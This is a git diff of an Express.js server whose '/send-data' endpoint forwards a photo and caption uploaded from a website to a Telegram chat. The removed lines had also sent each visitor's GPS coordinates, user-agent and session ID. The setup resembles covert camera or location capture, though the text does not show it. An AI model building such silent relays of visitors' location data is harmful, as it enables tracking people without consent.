@@ -71,25 +71,13 @@ app.post("/bot-webhook", express.json(), async (req, res) => {
 // Endpoint untuk menerima data dari website
 app.post("/send-data", upload.single("photo"), async (req, res) => {
     try {
-        const { latitude, longitude, caption } = req.body; // Lokasi
-        const session = req.query.session; // ID sesi
-        const userAgent = req.headers["user-agent"]; // User-Agent pengguna
-   
+        const { caption } = req.body;
 
-        const info = `
-        **Data Pengguna:**
-        - User-Agent: ${userAgent}
-        - Lokasi: https://www.google.com/maps?q=${latitude},${longitude}
-        - Sesi ID: ${session}
-        `;
-
-        
         // Kirim foto ke bot Telegram
         const formData = new FormData();
         formData.append("chat_id", CHAT_ID);
         formData.append("photo", req.file.buffer, "photo.jpg");
         formData.append("caption", caption);
-        formData.append("info", info);
         
 
         const response = await fetch(`${telegramApiUrl}sendPhoto`, {
